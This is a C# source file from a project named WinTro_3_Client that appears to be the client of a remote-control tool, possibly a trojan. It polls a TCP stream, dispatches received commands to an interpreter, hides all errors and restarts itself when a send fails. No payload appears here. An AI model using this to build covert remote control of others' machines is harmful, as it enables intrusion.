using System;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Timers;
using System.Windows.Forms;

namespace WinTro_3_Client;

internal class Data
{
	public Client client;

	public NetworkStream Stream;

	private Timer DataCheckTimer = new Timer(1000.0);

	public Data(Client _client)
	{
		client = _client;
		Stream = client.TCPClient.GetStream();
		DataCheckTimer.Elapsed += Timer_Tick;
	}

	public void StartChecking()
	{
		DataCheckTimer.Start();
		Debug.Log("Started data checking for server " + client.IP + "!");
	}

	public void StopChecking()
	{
		DataCheckTimer.Stop();
		Debug.Log("Stopped data checking for server " + client.IP + "!");
	}

	private void Timer_Tick(object sender, ElapsedEventArgs e)
	{
		Check();
	}

	public void Check()
	{
		if (client.TCPClient.Available <= 0)
		{
			return;
		}
		byte[] array = new byte[client.TCPClient.Available];
		Stream.Read(array, 0, array.Length);
		string @string = Encoding.UTF8.GetString(array);
		string[] array2 = Regex.Split(@string, "{FINE-FLUSSO-DATI}");
		try
		{
			for (int i = 0; i < array2.Length - 1; i++)
			{
				client.Comandi.InterpretaComando(array2[i]);
			}
		}
		catch (Exception)
		{
		}
	}

	public void Send(string message)
	{
		try
		{
			string s = message + "{FINE-FLUSSO-DATI}";
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			Stream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
			Application.Restart();
			Environment.Exit(0);
		}
	}
}
